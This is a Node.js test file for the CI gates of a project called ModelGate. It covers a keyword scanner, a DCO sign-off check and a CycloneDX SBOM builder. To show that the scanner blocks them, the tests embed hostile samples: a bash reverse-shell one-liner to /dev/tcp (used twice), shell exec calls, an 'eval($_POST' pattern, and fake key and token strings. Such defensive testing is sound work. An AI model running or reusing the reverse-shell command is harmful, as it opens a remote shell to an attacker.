// test-gates.mjs — offline tests for the ModelGate CI gates (node:test).
// Run: node --test ci/test-gates.mjs
import { test } from "node:test";
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";

import { scanFile, scanTree } from "./check-keywords.mjs";
import { checkCommit } from "./check-dco.mjs";
import { buildBom, validateBom } from "./sbom.mjs";

const ciDir = dirname(fileURLToPath(import.meta.url));
const repoRoot = join(ciDir, "..");

test("clean production Go file yields no findings", () => {
  const out = scanFile("internal/scan/analyze.go", "package scan\nfunc run() {}\n");
  assert.deepEqual(out, []);
});

test("exec in production Go is blocked", () => {
  const out = scanFile("internal/scan/evil.go", 'package scan\nvar c = exec.Command("sh")\n');
  assert.equal(out.length, 1);
  assert.equal(out[0].rule, "SCOPE-EXEC-001");
});

test("exec in tests and rule files is allowed", () => {
  assert.deepEqual(scanFile("internal/scan/evil_test.go", "exec.Command(\"sh\")"), []);
  assert.deepEqual(scanFile("internal/scan/rules.go", '"os/exec"'), []);
});

test("unsafe-based dynamic loading is blocked in production", () => {
  const out = scanFile("internal/x.go", "package x\nimport \"unsafe\"\n");
  assert.equal(out[0]?.rule, "SCOPE-EVAL-001");
});

test("reverse shell one-liner is blocked in any file type", () => {
  const marker = "bash -i >& /dev/tcp/10.0.0.1/443 2>&1";
  const out = scanFile("notes.md", marker);
  assert.equal(out[0]?.rule, "OFFENSE-REVSHELL-001");
});

test("private key material is blocked", () => {
  const key = "-----BEGIN RSA PRIVATE KEY-----\nMIIE\n-----END RSA PRIVATE KEY-----";
  assert.equal(scanFile("docs/key.md", key)[0]?.rule, "SCOPE-SECRETS-001");
});

test("fake tokens are blocked", () => {
  assert.equal(scanFile("a.md", "token hf_AbCdEfGhIjKlMnOpQrStUvWxYz0123456789")[0]?.rule, "SCOPE-SECRETS-001");
});

test("detection-rule context is not treated as offense", () => {
  // The scanner's own rules legitimately mention dangerous APIs.
  const out = scanFile("internal/scan/rules.go", 'pattern: "eval($_POST", why: "x"');
  assert.deepEqual(out, []);
});

test("the repository passes its own keyword gate", () => {
  const findings = scanTree(repoRoot);
  assert.deepEqual(findings, [], JSON.stringify(findings, null, 2));
});

test("keyword gate CLI exits 0 on the repository", () => {
  const out = execFileSync(
    process.execPath,
    [join(ciDir, "check-keywords.mjs"), "--root", repoRoot],
    { encoding: "utf8" },
  );
  assert.match(out, /clean/);
});

test("keyword gate CLI exits 1 on a finding", () => {
  const dir = mkdtempSync(join(tmpdir(), "mg-gate-"));
  try {
    writeFileSync(join(dir, "bad.md"), "bash -i >& /dev/tcp/10.0.0.1/443 2>&1\n");
    let code = 0;
    let out = "";
    try {
      out = execFileSync(process.execPath, [join(ciDir, "check-keywords.mjs"), "--root", dir], {
        encoding: "utf8",
      });
    } catch (err) {
      code = err.status;
      out = `${err.stdout ?? ""}${err.stderr ?? ""}`;
    }
    assert.equal(code, 1, out);
    assert.match(out, /OFFENSE-REVSHELL-001/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("dco accepts a matching sign-off", () => {
  const res = checkCommit("feat: x", "Signed-off-by: Trung <trung@example.com>", "trung@example.com");
  assert.equal(res.ok, true);
});

test("dco rejects a missing sign-off", () => {
  const res = checkCommit("feat: x", "", "trung@example.com");
  assert.equal(res.ok, false);
  assert.match(res.reason, /missing/);
});

test("dco rejects a mismatched sign-off", () => {
  const res = checkCommit("feat: x", "Signed-off-by: Other <other@example.com>", "trung@example.com");
  assert.equal(res.ok, false);
  assert.match(res.reason, /does not match/);
});

test("sbom builds a valid CycloneDX 1.6 document", () => {
  const bom = buildBom(
    [
      { Path: "github.com/trungminhdo4-glitch/modelgate", Version: "", Main: true },
      { Path: "golang.org/x/text", Version: "v0.14.0" },
    ],
    { serial: "11111111-2222-3333-4444-555555555555", timestamp: "2026-11-11T12:00:00Z", toolVersion: "1.0.0" },
  );
  assert.deepEqual(validateBom(bom), []);
  assert.equal(bom.bomFormat, "CycloneDX");
  assert.equal(bom.specVersion, "1.6");
  assert.equal(bom.components[0].type, "application");
  assert.equal(bom.components[1].type, "library");
  assert.equal(bom.components[1].purl, "pkg:golang/golang.org/x/text@v0.14.0");
});

test("sbom validation rejects bad documents", () => {
  assert.ok(validateBom({ bomFormat: "SPDX", specVersion: "1.6", components: [] }).length >= 2);
  assert.ok(validateBom({ bomFormat: "CycloneDX", specVersion: "1.6", components: [{ type: "nope" }] }).length >= 1);
});

test("sbom CLI writes a parseable document", () => {
  const dir = mkdtempSync(join(tmpdir(), "mg-sbom-"));
  const outPath = join(dir, "sbom.cdx.json");
  try {
    execFileSync(
      process.execPath,
      [join(ciDir, "sbom.mjs"), "--out", outPath, "--timestamp", "2026-11-11T12:00:00Z", "--tool-version", "1.0.0"],
      { cwd: repoRoot, encoding: "utf8" },
    );
    const bom = JSON.parse(readFileSync(outPath, "utf8"));
    assert.deepEqual(validateBom(bom), []);
    assert.ok(bom.components.some((c) => c.name === "github.com/trungminhdo4-glitch/modelgate"));
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});
